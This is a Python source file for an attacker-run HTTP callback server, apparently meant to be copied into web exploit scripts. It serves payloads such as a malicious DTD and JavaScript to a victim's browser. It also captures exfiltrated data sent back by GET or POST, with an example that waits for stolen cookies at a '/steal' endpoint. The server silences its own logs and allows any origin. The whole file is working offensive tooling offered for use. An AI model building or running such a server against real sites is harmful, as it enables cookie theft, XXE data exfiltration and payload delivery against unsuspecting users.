#!/usr/bin/env python3
"""
Dual-purpose HTTP server: serve payloads to the victim + receive exfiltrated data.

Responsibilities:
  GET     → (1) Capture exfil data from query string into EXFIL_DATA[path]
            (2) Serve registered files from SERVED_FILES[path]
  POST    → Parse JSON or form-encoded body; store in EXFIL_DATA[path]
  OPTIONS → CORS preflight — required when victim JS uses fetch() with non-simple headers

Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):

    # Register a file to serve
    SERVED_FILES["/evil.dtd"] = (dtd_payload, "application/xml-dtd")
    SERVED_FILES["/payload.js"] = (js_payload, "application/javascript")

    # Start the server (runs in daemon thread — auto-stops when main exits)
    httpd = start_server(host=lhost, port=80)

    # Wait for a callback (e.g. XSS cookie theft)
    while "/steal" not in EXFIL_DATA:
        time.sleep(0.5)
    raw_b64 = EXFIL_DATA["/steal"]["b64_cookie"]

    # Shut down when done
    httpd.shutdown()
    httpd.server_close()
"""

import datetime
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

# ==============================================================================
# SHARED STATE (copy this, the REQUEST HANDLER, and START SERVER into your main script)
# ==============================================================================

# {url_path: (content, content_type)} — files served to the victim browser
SERVED_FILES: dict = {}

# {url_path: {param_name: param_value}} — data received from victim browser
EXFIL_DATA: dict = {}

# ==============================================================================
# CONSOLE HELPERS (inline so this module is self-contained)
# ==============================================================================

def _ok(msg):   print(f"  [+] {msg}")
def _info(msg): print(f"  [*] {msg}")

# ==============================================================================
# REQUEST HANDLER
# ==============================================================================

class CallbackHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass  # suppress default Apache-style access logs

    def do_GET(self):
        parsed       = urlparse(self.path)
        path         = parsed.path
        query_string = parsed.query
        client_ip    = self.client_address[0]
        timestamp    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ── 1. Capture exfil data from GET query parameters ───────────────────
        if query_string:
            params = {
                k: v[0]
                for k, v in parse_qs(query_string).items()
            }
            EXFIL_DATA[path] = params
            _ok(f"GET  {self.path}  ←  {client_ip}  [{timestamp}]")
            for k, v in params.items():
                _ok(f"     {k} = {v}")

        # ── 2. Serve registered payloads ──────────────────────────────────────
        entry = SERVED_FILES.get(path)
        if not entry:
            self.send_response(404)
            self.end_headers()
            return

        content, content_type = entry
        body = content.encode() if isinstance(content, str) else content

        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)
        _info(f"GET  {path} → served ({len(body)} bytes) to {client_ip} [{timestamp}]")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body           = self.rfile.read(content_length).decode(errors="replace")
        path           = urlparse(self.path).path
        content_type   = self.headers.get("Content-Type", "")
        client_ip      = self.client_address[0]
        timestamp      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if "json" in content_type:
            try:
                parsed_body = json.loads(body)
            except json.JSONDecodeError:
                parsed_body = {"_raw": body}
        else:
            parsed_body = {
                k: v[0]
                for k, v in parse_qs(body).items()
            }

        EXFIL_DATA[path] = parsed_body

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

        _ok(f"POST {path}  ←  {client_ip}  [{timestamp}]")
        for k, v in parsed_body.items():
            _ok(f"     {k} = {v}")

    def do_OPTIONS(self):
        """CORS preflight — required when victim JS uses fetch() with non-simple headers."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()


# ==============================================================================
# START SERVER
# ==============================================================================

def start_server(host: str = "0.0.0.0", port: int = 80) -> HTTPServer:
    """
    Start the callback/file server in a background daemon thread.

    Returns the HTTPServer instance so the caller can shut it down:
        httpd.shutdown()
        httpd.server_close()
    """
    httpd = HTTPServer((host, port), CallbackHandler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    _info(f"Callback server listening → http://{host}:{port}")
    return httpd


# ==============================================================================
# STANDALONE: python3 web_callback_server.py [host] [port]
# ==============================================================================

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    httpd = start_server(host, port)
    try:
        threading.Event().wait()  # block forever until Ctrl+C
    except KeyboardInterrupt:
        print("\n  [*] Shutting down.")
        httpd.shutdown()
        httpd.server_close()
